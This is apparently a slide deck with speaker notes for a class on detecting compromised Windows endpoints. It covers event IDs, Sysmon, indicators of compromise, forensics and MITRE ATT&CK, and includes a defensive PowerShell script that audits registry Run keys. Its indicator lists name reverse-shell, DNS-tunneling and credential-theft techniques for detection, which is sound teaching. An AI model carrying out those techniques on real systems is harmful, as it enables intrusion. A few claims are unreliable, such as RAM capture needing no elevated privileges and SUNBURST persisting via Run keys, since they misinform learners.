---
deck:
  title: Detecting Device Attacks
  kicker: Class 19
  accent: "#B3001B"
  background: "#FFFFFF"
  logo: logo.png
  background_image: bg.png
  class_number: 19
  description: Indicators of compromise and how to recognize a device that's already been breached.
  topics: [Endpoint Monitoring, Logs, Indicators of Compromise, Compromised Devices]
---

%%%
---
title: Detecting Device Attacks
cover: true
---
:::text class=sub
Endpoint Telemetry, Indicators of Compromise, and Digital Forensics
:::

:::image src="images/19_detecting_attacks_overview.png" alt="Overview diagram showing the three pillars of detecting device attacks: endpoint telemetry collection, indicator analysis, and forensic investigation" caption="Detection as the critical backstop: telemetry, indicators, and forensics working together to surface compromises." width=full
:::

:::list style=chips
- The Detection Backstop & Assume Breach
- Windows Event Logs & Microsoft Sysmon
- David Bianco's Pyramid of Pain & TTPs
- RFC 3227 Order of Volatility (Forensics)
:::

:::notes
Welcome to Class 19, "Detecting Device Attacks." In our previous sessions, we focused on preventive controls: host hardening, access control policies, and authentication. While these controls reduce risk, they are not infallible. A sophisticated adversary can bypass them by using zero-day exploits, compromised administrative credentials, or social engineering.

Today, we will focus on detection, which serves as a critical backstop in security operations. We will analyze endpoint detection through SANS digital forensics guidelines and the MITRE ATT&CK framework. We will examine how system telemetry, collected via Windows Event Logs and Microsoft Sysmon, is used to identify unauthorized activity. We will study the "Pyramid of Pain" to understand the difference between static file indicators and behavioral indicators. Finally, we will cover RFC 3227 standards for digital forensics, explaining how to preserve volatile evidence during an active investigation. Let's begin by discussing why we must transition to an "assume breach" mindset.

According to the Mandiant M-Trends 2023 report, the median attacker dwell time, the period between initial breach and detection, has decreased to 16 days globally; however, in organizations without mature detection programs, dwell times can extend to months. This statistic underscores the operational value of the telemetry and detection methods we will cover today. The National Institute of Standards and Technology (NIST) Special Publication 800-137, Information Security Continuous Monitoring (ISCM) for Federal Information Systems and Organizations, provides the foundational framework for the continuous monitoring approach we will study. Additionally, the MITRE ATT&CK framework, a globally recognized knowledge base of adversary tactics and techniques, will serve as our reference for mapping observed behaviors to attacker goals throughout this class. The 2020 SolarWinds supply chain compromise, in which the SUNBURST backdoor evaded prevention controls for months, is a landmark case study demonstrating why detection is an essential, not optional, security capability.
:::

%%%
---
unit: Foundations
code: DET
title: The Detection Backstop & Assume Breach
---
:::callout style=soft
The **Assume Breach** model (NIST SP 800-207 Zero Trust Architecture) assumes that an adversary has already bypassed network and host perimeters, focusing security efforts on rapid detection, containment, and continuous monitoring.
:::

:::image src="images/19_assume_breach_mindset.png" alt="Diagram contrasting the traditional Prevention-First model with the Assume Breach model, showing how detection and behavioral analysis fill the gap left by prevention failures" caption="The Assume Breach model: when prevention controls fail, behavioral monitoring and continuous detection become the primary defense layer." width=full
:::

::::columns ratio=1:1
::col::
::::card heading="Limitations of Prevention"
:::list style=plain
- **Zero-Day Exploits:** Vulnerabilities with no available vendor patches.
- **Credential Abuse:** Valid credentials used by unauthorized actors, which do not trigger access violations.
- **Living off the Land:** Adversaries using built-in system administration tools (e.g., PowerShell, WMI) to blend in with normal administrative activity.
:::
::::
::col::
::::card heading="Detection Objectives"
:::list style=plain
- **Dwell Time Reduction:** Minimizing the time an attacker remains undetected on a system.
- **Behavioral Analysis:** Identifying anomalies in process execution and network connections.
- **Forensic Readiness:** Maintaining system logs to support post-incident investigations.
:::
::::
::::

:::steps
1. **Collect:** Continuously gather endpoint telemetry, process creation, network connections, registry changes, via Sysmon and Windows Event Logs.
2. **Detect:** Identify anomalous behavioral patterns by correlating telemetry against known MITRE ATT&CK tactics and techniques.
3. **Alert:** Trigger SIEM correlation rules and notify SOC analysts when behavioral thresholds are exceeded.
4. **Analyze:** Validate the alert, determine scope of affected hosts, and classify incident severity.
5. **Respond:** Escalate to the CSIRT and execute containment procedures per the Incident Response Plan.
:::

:::notes
For many years, cybersecurity focused primarily on prevention. The goal was to build strong firewalls and enforce strict access policies to keep attackers out. However, modern security architectures, including Zero Trust (NIST SP 800-207), operate under the assumption that perimeters will fail. This is known as the "Assume Breach" mindset.

Prevention can fail for several reasons. Attackers may use zero-day exploits that bypass patches, or abuse valid credentials stolen through phishing. Once inside, they often use "Living off the Land" techniques, executing commands using built-in tools like PowerShell or Windows Management Instrumentation (WMI). Because these tools are legitimate, their execution does not trigger standard access blocks. Consequently, organizations must deploy continuous monitoring to identify anomalous behavior, focusing on reducing dwell time, the duration an attacker remains undetected, to minimize potential damage.

The concept of Zero Trust was formalized by NIST in SP 800-207 (published August 2020), which mandates that all access requests be authenticated and authorized regardless of their network origin. This architecture assumes that neither the internal network nor the endpoint device is inherently trusted. Living off the Land (LoTL) attacks demonstrate why this matters: in the 2021 Colonial Pipeline ransomware attack, attackers gained initial access via a compromised VPN credential and moved laterally using legitimate remote desktop tools, no custom malware was necessary. MITRE ATT&CK categorizes these techniques as T1059.001 (PowerShell) and T1047 (Windows Management Instrumentation). Industry data from CrowdStrike's 2023 Global Threat Report indicates that 71 percent of detected attacks involved malware-free techniques, relying entirely on legitimate tools. This makes behavioral analysis, identifying what tools are doing rather than what they are, the essential component of a modern detection program.
:::

%%%
---
unit: Telemetry
code: TEL
title: Endpoint Telemetry & Log Sources
---
:::callout style=soft
**Endpoint Telemetry** is the continuous collection and analysis of host-level data, including process executions, network socket connections, file modifications, and registry changes.
:::

:::image src="images/19_endpoint_telemetry_architecture.png" alt="Architecture diagram showing how Windows Event Logs and Microsoft Sysmon feed into a centralized SIEM system for analysis, with labeled event ID examples at each collection point" caption="Endpoint telemetry pipeline: raw OS events flow from Windows Event Logs and Sysmon into a SIEM for centralized correlation and alerting." width=full
:::

::::columns ratio=1:1
::col::
::::card heading="Windows Event Log Architecture"
:::list style=plain
- **Security Log:** Records authentication events (Event ID 4624 for successful logons, 4625 for failed logons).
- **System Log:** Tracks driver loads, hardware events, and system services (Event ID 7045 for new service installations).
- **Application Log:** Records events generated by installed software and database engines.
:::
::::
::col::
::::card heading="Microsoft Sysmon (System Monitor)"
:::list style=plain
- **Process Creation (ID 1):** Captures the command line, parent process, and file hashes of new processes.
- **Network Connections (ID 3):** Logs TCP/UDP connections initiated by local processes, including source/destination IPs.
- **Registry Modification (ID 12/13):** Records changes to system startup keys used for persistence.
:::
::::
::::

:::notes
To detect host-level attacks, security teams need visibility into operating system activity. This visibility is built on endpoint telemetry, which is compiled from system logs. In a Windows environment, this telemetry is gathered through the Windows Event Log service, which organizes events into Security, System, and Application logs.

For example, the Security log records logon events, such as Event ID 4624. Monitoring this log helps identify credential abuse, such as anomalous login times. However, because standard Event Logs may lack detail on process actions, security teams often install Microsoft Sysmon. Sysmon provides granular logging, capturing command-line details and file hashes for new processes. If a command-line utility attempts to access system memory, Sysmon logs the event, giving security operations center (SOC) analysts the data needed to identify and investigate potential compromises.

NIST Special Publication 800-92, Guide to Computer Security Log Management, establishes baseline requirements for log generation, storage, and analysis in enterprise environments. It recommends retaining security logs for a minimum of ninety days, with long-term archival of twelve months or more for compliance-sensitive systems. In practice, raw Windows Event Logs lack the detail required for advanced threat detection. For example, Security Event 4688 (Process Creation) requires additional audit policy configuration to include command-line arguments. Microsoft Sysmon fills this gap by using a kernel-mode driver to intercept process creation at a lower level, capturing full command-line arguments, parent process GUIDs, and PE file hashes automatically. These Sysmon events are then forwarded via Windows Event Forwarding (WEF) or a SIEM agent to a centralized Security Information and Event Management (SIEM) system. The 2013 Target data breach serves as a cautionary example: security monitoring tools flagged anomalous network traffic from the point-of-sale systems, but alerts were not acted upon in time, resulting in the theft of forty million payment card records. MITRE ATT&CK data sources DS0009 (Process) and DS0029 (Network Traffic) map directly to the Sysmon event types covered in this slide.
:::

%%%
---
unit: Indicators
code: IOC
title: Indicators of Compromise (IOCs)
---
:::callout style=soft
An **Indicator of Compromise (IOC)** is forensic evidence indicating that a system or network has been breached. **David Bianco's Pyramid of Pain** illustrates the difficulty attackers face when different indicators are defended.
:::

:::image src="images/19_pyramid_of_pain.png" alt="David Bianco's Pyramid of Pain rendered as a labeled triangle diagram with six levels from Trivial at the base (Hash Values) to Tough at the apex (TTPs), using a color gradient from green to red" caption="The Pyramid of Pain: indicators higher on the pyramid impose progressively greater cost on attackers when defenders act on them." width=full
:::

:::code language=mermaid caption="David Bianco's Pyramid of Pain"
graph TD
    TTPs[TTPs: Tactics, Techniques & Procedures - Tough] --> Tools[Tools: Software used by attackers - Challenging]
    Tools --> Network[Network/Host Artifacts: Registry keys, files - Annoying]
    Network --> Domains[Domain Names: C2 infrastructure - Simple]
    Domains --> IPs[IP Addresses: Network addresses - Easy]
    IPs --> Hashes[Hash Values: File signatures - Trivial]
    style Hashes fill:#f9f,stroke:#333,stroke-width:2px
    style TTPs fill:#f96,stroke:#333,stroke-width:2px
:::

:::notes
An Indicator of Compromise (IOC) is a forensic artifact that suggests unauthorized access. These indicators include file hashes, IP addresses, registry keys, and behavioral patterns. To evaluate the effectiveness of these indicators, security teams use David Bianco's Pyramid of Pain.

The pyramid organizes indicators by the effort required for an attacker to change them when detected. At the bottom are hash values, which are trivial for an attacker to change by altering a single byte of code. IPs and domain names are also relatively easy to rotate. Consequently, defenses that rely solely on these indicators are easily bypassed. At the top of the pyramid are TTPs, Tactics, Techniques, and Procedures. TTPs represent the attacker's behavioral patterns, such as using process injection to execute code. Defending at the TTP level is highly effective because changing these patterns requires the attacker to rewrite their tools and retrain their staff, which is challenging and time-consuming.

The Pyramid of Pain was published by David Bianco in 2013 and has since become a cornerstone of threat intelligence programs. The sharing of IOC data across organizations is standardized by two specifications: Structured Threat Information eXpression (STIX) for representing threat data, and Trusted Automated eXchange of Intelligence Information (TAXII) as the transport protocol. These allow security teams to receive curated threat feeds and automatically block known-bad indicators. However, as the Pyramid illustrates, TTP-level defenses are far more durable. When the Russian GRU-linked group APT28 (also tracked as Fancy Bear) was detected during the 2016 Democratic National Committee breach, their infrastructure IPs and domains changed rapidly. What persisted were their TTPs, spear-phishing with credential harvesting pages and custom X-Agent implants. Security teams that detected these behavioral patterns could identify and block APT28 activity even after the group cycled through new infrastructure. CVE-2017-0144 (EternalBlue), exploited by WannaCry, is a case where IP blocking was ineffective; detecting the underlying SMB exploit behavior (MITRE ATT&CK T1210 Exploitation of Remote Services) was the only scalable defense.
:::

%%%
---
unit: Identification
code: IOC
title: Host-Based Indicators of Compromise
---
:::image src="images/19_host_ioc_indicators.png" alt="Split-panel diagram showing five host-based IOC categories on the left, process creation, account creation, registry modification, service installation, log clearing, mapped to their MITRE ATT&CK tactics on the right with connecting arrows" caption="Host-based IOCs mapped to the MITRE ATT&CK framework: each event category surfaces a specific adversary tactic." width=full
:::

:::table
| Artifact Category | Windows Event ID / Source | Suspicious Behavior | MITRE ATT&CK Tactic |
|---|---|---|---|
| **Process Creation** | Sysmon ID 1 / Security 4688 | Non-standard parent processes (e.g., `cmd.exe` spawned by `winword.exe`). | Execution (TA0002) |
| **Account Creation** | Security Event ID 4720 | Administrative accounts created outside maintenance windows. | Persistence (TA0003) |
| **Registry Modification** | Sysmon ID 12 / 13 | Executables registered in registry Run keys (`HKLM\Software\Microsoft\Windows\CurrentVersion\Run`). | Persistence (TA0003) |
| **Service Installation** | System Event ID 7045 | Installation of kernel-mode drivers or administrative services. | Privilege Escalation (TA0004) |
| **Log Clearing** | Security Event ID 1102 | The Security Event Log being cleared by an administrator account. | Defense Evasion (TA0005) |
:::

:::notes
This table details common host-based indicators of compromise, mapping system events to the MITRE ATT&CK framework. SOC analysts monitor these indicators to identify attacks in progress.

For example, process creation monitoring can reveal unauthorized activity. A standard user opening Microsoft Word should spawn a Word process. If that Word process spawns a command shell (`cmd.exe`) which then executes network commands, this behavior is a strong indicator of a macro-based exploit. Similarly, Service Installation (System Event ID 7045) must be monitored; attackers often create services to run malicious payloads with system-level privileges. Another critical indicator is Log Clearing (Security Event ID 1102). A user rarely has a legitimate reason to clear system logs; when this occurs, it typically indicates an attacker attempting to hide their traces during an active compromise.

Mapping host events to MITRE ATT&CK provides a systematic framework for alert prioritization. The process creation anomaly described, winword.exe spawning cmd.exe, matches CVE-2017-11882, a buffer overflow in the Microsoft Office Equation Editor that was widely exploited to deliver malware payloads via spear-phishing documents. MITRE ATT&CK classifies this pattern under T1203 (Exploitation for Client Execution) within the Execution tactic. Account creation (Event ID 4720) must be correlated with change management records; the 2014 Anthem Health Insurance breach involved attackers creating administrative accounts over months before exfiltrating over seventy-eight million patient records. Service installation (Event ID 7045) is used by attackers to achieve persistence with SYSTEM-level privileges, mapped to MITRE ATT&CK T1543.003 (Create or Modify System Process: Windows Service). Most critically, Log Clearing (Event ID 1102) was documented in the 2017 NotPetya destructive attack: before deploying its wiper payload, the malware cleared Windows Event Logs to delay forensic analysis. Any detection of this event should be treated as a high-severity incident indicator requiring immediate CSIRT activation.
:::

%%%
---
unit: Forensics
code: FOR
title: The Forensics Mindset & Evidence Volatility
---
:::callout style=soft
Digital forensics requires a structured methodology to preserve, acquire, and analyze digital evidence. **RFC 3227** defines the guidelines for evidence collection, establishing the **Order of Volatility**.
:::

:::image src="images/19_order_of_volatility.png" alt="Vertical pyramid diagram illustrating RFC 3227's Order of Volatility with six labeled layers from most volatile at the top (CPU Registers and Cache) to least volatile at the bottom (Physical Infrastructure), with a stopwatch icon indicating time-sensitivity decreasing downward" caption="RFC 3227 Order of Volatility: forensic investigators must capture the most ephemeral data first to preserve evidence that disappears at shutdown." width=full
:::

:::steps
1. **CPU Registers & Cache:** The most volatile data, lost in microseconds.
2. **Routing Tables, ARP Cache & RAM:** Active network connections, running processes, decrypted keys, and memory-only malware.
3. **Temporary File Systems:** Cached system data and swap space.
4. **Persistent Storage (Disk):** Hard drives, SSDs, and partition tables.
5. **Remote Monitoring Data:** Firewall logs, SIEM dashboards, and netflow data.
6. **Physical Infrastructure:** Network cables, routers, and physical topology configurations.
:::

:::notes
When a system compromise is detected, the initial response is critical. A common mistake is to reboot or power down the system. While this may stop malware execution, it destroys volatile evidence needed to understand the scope and origin of the breach.

To prevent this, digital forensics specialists follow RFC 3227 guidelines, which establish the Order of Volatility. This order dictates that investigators must capture the most volatile data first. The most critical volatile asset is physical RAM. Memory contains active network connections, running processes, and sometimes decrypted cryptographic keys or passwords. Wiping this data makes it difficult to determine how the attacker gained access. Therefore, responders use specialized tools to capture a memory image before performing persistent disk analysis or shutting down the machine.

The legal and procedural framework for digital evidence collection extends beyond RFC 3227. ISO/IEC 27037:2012 (Information Technology, Security Techniques, Guidelines for Identification, Collection, Acquisition, and Preservation of Digital Evidence) provides an internationally recognized standard for maintaining the admissibility of digital evidence in legal proceedings. A core principle is chain of custody, a chronological log that records who handled the evidence, when, and why. Breaks in this chain can render evidence inadmissible in court. Practical memory acquisition is performed using tools such as WinPMEM (open source) or Magnet RAM Capture, which create bit-for-bit copies of physical RAM without requiring elevated privileges. These images are then analyzed using the Volatility Framework, an open-source tool that can extract running processes, network connections, and encryption keys from raw memory dumps. Fileless malware, such as the PowerShell-based Kovter trojan (MITRE ATT&CK T1059.001, T1055 Process Injection), exists entirely in RAM and leaves no persistent disk artifacts, making memory acquisition the only viable forensic path. NIST SP 800-86 (Guide to Integrating Forensic Techniques into Incident Response) provides operational guidelines for combining forensic procedures with active incident response workflows.
:::

%%%
---
unit: Analysis
code: LOG
title: Scripted Log Auditing
---
:::callout style=soft
System administrators and analysts use automated scripts to search through host logs for indicators of compromise, reducing response times.
:::

:::image src="images/19_registry_log_audit.png" alt="Diagram showing the PowerShell log auditing workflow: a script queries three registry run key paths, compares results against a known-good baseline, and flags deviations for SOC review" caption="Automated registry auditing: scripts systematically enumerate startup persistence locations and surface unauthorized executables for analyst review." width=full
:::

:::steps
1. **Define Audit Scope:** Identify which registry keys, Event Log channels, and startup locations require periodic inspection.
2. **Execute Queries:** Run PowerShell or WMI scripts to enumerate registry run keys, scheduled tasks (Event ID 4698), and installed services.
3. **Baseline Comparison:** Compare current values against a known-good configuration baseline captured during system provisioning.
4. **Flag Anomalies:** Identify entries that reference unauthorized executables, unusual file paths, or unsigned binaries.
5. **Document & Escalate:** Record all findings with timestamps and escalate confirmed indicators to the SOC for investigation.
:::

:::code language=powershell caption="PowerShell Script to Detect Registry Persistence"
# Query registry run keys for potential persistence mechanisms
$RunKeys = @(
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
)
foreach ($Path in $RunKeys) {
    if (Test-Path $Path) {
        Write-Output "Auditing Registry Path: $Path"
        Get-ItemProperty -Path $Path | 
            Select-Object -Property * -ExcludeProperty PSPath, PSParentPath, PSChildName, PSDrive, PSProvider |
            Out-String
    }
}
:::

:::notes
To audit system integrity efficiently, administrators deploy scripts that automate log analysis. These scripts query critical system directories and registry paths for unauthorized modifications.

The PowerShell script shown here audits registry locations that control startup behavior. Attackers frequently use these registry keys to maintain persistence, ensuring their malware launches automatically when the system boots. By running automated audits on these keys, security teams can identify unauthorized executables, verify administrative changes, and detect compromises before they escalate.

NIST SP 800-92 (Guide to Computer Security Log Management) recommends that organizations implement automated log analysis tools to reduce analyst workload and decrease mean time to detect (MTTD). The PowerShell script demonstrated on this slide specifically targets registry Run keys, which are mapped to MITRE ATT&CK T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder) under the Persistence tactic (TA0003). Maintaining registry run key persistence was a documented technique used by the SUNBURST backdoor in the 2020 SolarWinds supply chain attack, where the malware registered itself to execute on system startup. Automated auditing of these keys against a known-good baseline would have been an effective detection method. Beyond registry run keys, security analysts should script audits of complementary persistence mechanisms, including Scheduled Tasks (Event ID 4698), WMI event subscriptions (MITRE ATT&CK T1546.003), and startup folder contents. The Sysinternals Autoruns utility, developed by Mark Russinovich, provides a comprehensive GUI-based view of all Windows persistence mechanisms and is a common first-response tool for analysts. To ensure PowerShell scripts themselves are auditable, organizations should enable PowerShell Script Block Logging (configured via Group Policy) and Module Logging, which capture the complete text of all executed PowerShell commands in the Windows Event Log under the Microsoft-Windows-PowerShell/Operational channel (Event ID 4104). This provides a secondary layer of detection for attackers who use PowerShell to modify persistence keys programmatically.
:::

%%%
---
unit: Telemetry
code: TEL
title: Windows Event Log Deep Dive, Key Event IDs
---
:::callout style=soft
Not all Windows Event IDs carry equal forensic weight. Security analysts maintain a prioritized reference of high-signal event IDs that most reliably indicate unauthorized activity.
:::

:::image src="images/19_windows_event_ids_reference.png" alt="Color-coded reference card organized into four columns, Authentication, Persistence, Privilege, and Evasion, each listing the most critical Windows Security Event IDs with brief descriptions" caption="High-signal Windows Event ID reference: analysts should memorize these event IDs as the first layer of host-based detection." width=full
:::

:::table
| Event ID | Log | Description | Detection Value |
|---|---|---|---|
| 4624 | Security | Successful account logon | Logon type 3 (network) from unusual hours or IP |
| 4625 | Security | Failed account logon | Brute-force threshold, 5+ failures per minute |
| 4648 | Security | Logon using explicit credentials | Pass-the-hash and lateral movement |
| 4720 | Security | User account created | Unauthorized admin account creation |
| 4732 | Security | Member added to security-enabled local group | Privilege escalation to Administrators group |
| 4768 | Security | Kerberos TGT requested (AS-REQ) | Kerberoasting reconnaissance |
| 4769 | Security | Kerberos service ticket requested (TGS-REQ) | Kerberoasting ticket harvesting |
| 4776 | Security | NTLM authentication | NTLM relay attacks and pass-the-hash |
| 1102 | Security | Audit log cleared | Defense evasion, high severity |
| 7045 | System | New service installed | Persistence via malicious service |
:::

:::notes
Windows generates thousands of event log entries per hour on a busy enterprise system. Security analysts cannot review every entry manually. This slide provides a curated reference of the event IDs that carry the highest forensic signal, the ones worth building detection rules around first.

Let us walk through some of the most operationally important entries. Event ID 4624 (successful logon) is logged every time a user authenticates. On its own, it is noise. However, filtering for Logon Type 3 (network logon) from a workstation account, rather than a service account, at 3:00 AM is a very different story. This pattern matches lateral movement behavior where an attacker with stolen credentials authenticates to file shares or remote systems. MITRE ATT&CK T1078 (Valid Accounts) covers this technique precisely. The 2021 Hafnium Microsoft Exchange exploitation campaign relied heavily on network logons using compromised service account credentials, which would have been detectable via Event ID 4624 correlation with Logon Type 3 and non-standard source IPs.

Event IDs 4768 and 4769, related to Kerberos ticket requests, are the primary detection point for Kerberoasting attacks (MITRE ATT&CK T1558.003). In a Kerberoasting attack, an attacker requests service tickets for accounts with Service Principal Names (SPNs) registered in Active Directory, then cracks the ticket offline to recover the service account password. The detection signature is a single user account requesting an unusually large number of TGS tickets in a short time window, something that does not occur during normal operations. Tools like BloodHound and Rubeus are commonly used to automate this attack.

Event ID 4776, NTLM credential validation, is the key detection point for pass-the-hash attacks (MITRE ATT&CK T1550.002) and NTLM relay attacks (T1557.001). Organizations should monitor for NTLM authentication to domain controllers from workstations, a pattern that should be rare in modern Kerberos-configured environments.

Which three Windows event IDs are worth monitoring above all others has no single answer; it depends on the organization's threat model, which is itself the point, prioritization must follow the threats that matter to a given environment.

NIST SP 800-92 section 4.3 recommends that organizations document their critical event IDs in a log management policy and configure SIEM correlation rules for each. The SANS Windows Event Log Cheat Sheet, updated annually, is a practical field reference that expands this list significantly.
:::

%%%
---
unit: Telemetry
code: TEL
title: Microsoft Sysmon, Configuration Deep Dive
---
:::callout style=soft
Sysmon's detection value depends entirely on its configuration. A poorly configured Sysmon generates noise; a well-tuned configuration, guided by community rulesets, provides surgical precision.
:::

:::image src="images/19_sysmon_configuration_workflow.png" alt="Three-panel diagram showing the Sysmon configuration lifecycle: raw XML rule file on the left, Sysmon kernel driver in the center filtering events, and structured event output on the right ingested by a SIEM" caption="Sysmon configuration lifecycle: XML rules define what events the kernel driver captures, filtering noise before events reach the SIEM." width=full
:::

:::table
| Sysmon Event ID | Event Name | Key Fields Captured | Primary Use Case |
|---|---|---|---|
| 1 | Process Create | CommandLine, ParentImage, Hashes, User | Execution chain analysis |
| 3 | Network Connect | SourceIP, DestinationIP, Port, ProcessName | C2 beaconing detection |
| 7 | Image Loaded | ImageLoaded, Signed, SignatureStatus | DLL injection detection |
| 8 | CreateRemoteThread | SourceProcessId, TargetProcessId | Process injection detection |
| 11 | File Created | TargetFilename, CreationTime | Dropper and payload delivery |
| 12/13 | Registry Key/Value | TargetObject, Details | Persistence via Run keys |
| 22 | DNS Query | QueryName, QueryResults | C2 domain resolution |
:::

:::notes
Microsoft Sysmon, the System Monitor utility from Sysinternals, operates as a kernel-mode Windows service that intercepts system calls and logs security-relevant events before they can be tampered with by user-mode processes. This architectural position makes it significantly harder for attackers to evade compared to user-mode logging agents.

However, a default Sysmon installation with no configuration file generates an enormous volume of events, often hundreds of thousands per hour on a busy workstation. Without a configuration file defining inclusion and exclusion rules, this volume makes SIEM storage cost prohibitive and buries true positives under false positives. The cybersecurity community has responded by developing open-source Sysmon configuration rulesets. The most widely adopted is the SwiftOnSecurity Sysmon configuration (github.com/SwiftOnSecurity/sysmon-config), which provides a carefully curated set of inclusion rules that capture high-value events while excluding known-good system processes. The Olaf Hartong modular Sysmon configuration extends this further with MITRE ATT&CK-tagged rule comments.

Let us focus on the highest-value Sysmon event types. Event ID 8 (CreateRemoteThread) captures the most important signal for process injection, MITRE ATT&CK T1055. In a legitimate system, processes rarely create threads inside other processes. When malware injects code into a trusted process like lsass.exe or svchost.exe to execute under that process's security context, Event ID 8 captures the source and target process IDs, providing a direct forensic record. The 2017 WannaCry ransomware used process injection extensively to evade detection; Sysmon Event ID 8 would have flagged this behavior even before the ransomware executed its encryption payload.

Event ID 22 (DNS Query) is particularly valuable for detecting command-and-control (C2) beaconing. When malware resolves its C2 server's domain name, Sysmon captures the query and the process that initiated it. A legitimate browser process resolving news.bbc.co.uk is expected. PowerShell.exe resolving a newly registered domain with a high entropy name (e.g., xk3mf7.xyz) at regular five-minute intervals is not. This pattern matches MITRE ATT&CK T1071.004 (Application Layer Protocol: DNS) used for C2 communication.

With a tool like Sysmon, most of the operational value comes from the quality of the XML configuration rather than the tool itself; a new configuration can be applied without a reboot, so tuning is continuous.
:::

%%%
---
unit: Indicators
code: IOC
title: Network-Based Indicators of Compromise
---
:::callout style=soft
Host-based telemetry reveals what a process is doing locally. **Network-based IOCs** reveal where it is communicating, exposing command-and-control channels, data exfiltration paths, and lateral movement activity.
:::

:::image src="images/19_network_ioc_detection.png" alt="Network diagram showing three detection points: perimeter firewall logs capturing inbound exploitation attempts, internal network flow data revealing lateral movement, and DNS logs showing C2 domain resolution from an infected workstation" caption="Network-based IOC detection layers: perimeter logs, internal netflow, and DNS telemetry each reveal different phases of an attack lifecycle." width=full
:::

:::list style=plain
- **Beaconing Patterns:** Malware communicating with C2 at fixed intervals (e.g., every 60 seconds) creates a detectable "heartbeat" in netflow data.
- **DNS Tunneling:** Attackers encode data in DNS query subdomain labels to exfiltrate data through permissive DNS egress policies (MITRE ATT&CK T1071.004).
- **Unusual Outbound Ports:** HTTPS traffic on port 4444 or 8080 may indicate a Metasploit Meterpreter reverse shell (MITRE ATT&CK T1571).
- **Lateral Movement Signatures:** SMB connections from a workstation to multiple internal hosts in sequence indicate credential-driven lateral movement (T1021.002).
- **Large Outbound Transfers:** Sudden spikes in outbound data volume to external IPs, especially after hours, are a primary data exfiltration indicator (T1048).
:::

:::notes
While host-based telemetry provides visibility into what is happening on a single machine, network-based indicators reveal the broader attack campaign. Attackers must communicate: they need to receive commands from their infrastructure, and ultimately they need to exfiltrate data. Every one of these communications creates a network artifact that can be detected.

Beaconing is the most reliable network-based indicator for identifying active malware. Most command-and-control frameworks, including Cobalt Strike, Empire, and Metasploit, implement a "sleep and callback" pattern where the implant sleeps for a configured interval then reaches out to the C2 server to check for new commands. This creates a periodic pattern in netflow data that statistical analysis can surface. Security teams analyzing netflow data look for endpoints making connections to the same external IP at suspiciously regular intervals. The Cobalt Strike framework, widely used by both red teams and threat actors, defaults to a 60-second beacon interval. The 2021 SolarWinds breach used a fourteen-day dormancy period before SUNBURST would begin C2 communication, a deliberate attempt to avoid short-term behavioral analysis.

DNS tunneling is a sophisticated exfiltration technique where data is encoded into DNS query subdomains. Since most organizations allow DNS traffic outbound through their firewall to support name resolution, DNS tunneling can bypass conventional firewall rules entirely. Tools like DNScat2 and Iodine implement this technique. Detection requires analyzing the length and entropy of DNS query strings, legitimate domain labels are short and human-readable, while encoded payloads are long and high-entropy. NIST SP 800-81-2 (Secure Domain Name System Deployment Guide) recommends implementing DNS Response Policy Zones (RPZ) and DNS logging to support detection of this technique.

For lateral movement detection, one of the most reliable signatures is a workstation initiating SMB connections (TCP port 445) to multiple other internal hosts in rapid succession. This behavior is characteristic of worm-like lateral movement (MITRE ATT&CK T1021.002 SMB/Windows Admin Shares) and was the primary propagation mechanism for both WannaCry (CVE-2017-0144) and NotPetya in 2017. Internal firewall rules, sometimes called "east-west" controls, that restrict workstation-to-workstation SMB communication are a highly effective countermeasure.

Attackers run command-and-control over encrypted HTTPS to blend in with normal web traffic. This is why encrypted traffic analysis and JA3 TLS fingerprinting matter: they identify the TLS handshake characteristics of known malware frameworks even when the payload itself cannot be read.
:::

%%%
---
unit: Framework
code: ATT
title: MITRE ATT&CK Framework, Tactical Overview
---
:::callout style=soft
The **MITRE ATT&CK framework** is a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. It provides a common language for describing attacker behavior and measuring detection coverage.
:::

:::image src="images/19_mitre_attack_matrix.png" alt="Simplified MITRE ATT&CK Enterprise matrix showing fourteen tactic columns, from Reconnaissance through Impact, with representative technique IDs listed under each column and color-coded to indicate detection coverage status" caption="MITRE ATT&CK Enterprise matrix: fourteen adversary tactics organized left-to-right in the order they typically occur during a campaign." width=full
:::

:::table
| Tactic | ID | Description | Example Technique |
|---|---|---|---|
| Reconnaissance | TA0043 | Gathering information before attacking | T1595 Active Scanning |
| Initial Access | TA0001 | Entry point into the target environment | T1566 Phishing |
| Execution | TA0002 | Running malicious code | T1059 Command and Scripting Interpreter |
| Persistence | TA0003 | Maintaining foothold after reboot | T1547 Boot Autostart Execution |
| Privilege Escalation | TA0004 | Gaining higher-level permissions | T1068 Exploitation for Privilege Escalation |
| Defense Evasion | TA0005 | Avoiding detection | T1055 Process Injection |
| Credential Access | TA0006 | Stealing credentials | T1003 OS Credential Dumping |
| Discovery | TA0007 | Exploring the environment | T1082 System Information Discovery |
| Lateral Movement | TA0008 | Moving to other systems | T1021 Remote Services |
| Collection | TA0009 | Gathering data of interest | T1074 Data Staged |
| Exfiltration | TA0010 | Stealing data | T1048 Exfiltration Over Alternative Protocol |
| Impact | TA0040 | Disrupting or destroying systems | T1486 Data Encrypted for Impact |
:::

:::notes
MITRE ATT&CK, Adversarial Tactics, Techniques, and Common Knowledge, was created by MITRE Corporation and first published in 2015, drawing on observations from real-world cyber intrusions. It has since become the de facto standard language for describing attacker behavior in threat intelligence reports, detection engineering, and red team assessments.

The framework organizes adversary behavior into fourteen tactics, which represent the "why" of an attacker's action, the goal they are trying to achieve. Under each tactic are techniques, which describe "how" the goal is achieved. Many techniques have sub-techniques that provide even more specificity. As of 2024, the ATT&CK Enterprise matrix contains over two hundred unique techniques and more than four hundred sub-techniques, each documented with procedure examples from real threat actor campaigns, detection guidance, and mitigation recommendations.

Understanding the tactic sequence is operationally important. Attacks typically progress left-to-right through the matrix: an attacker gains Initial Access, establishes Execution, achieves Persistence, then moves through Privilege Escalation and Defense Evasion before beginning Credential Access and Lateral Movement. This sequence creates detection opportunities at each stage. The earlier in the sequence a detection fires, the less damage an attacker can cause. A detection at Initial Access (phishing email) prevents all subsequent tactics. A detection at Exfiltration means the attacker has already achieved most of their goals. This is why NIST CSF DE.CM controls emphasize early-stage detection.

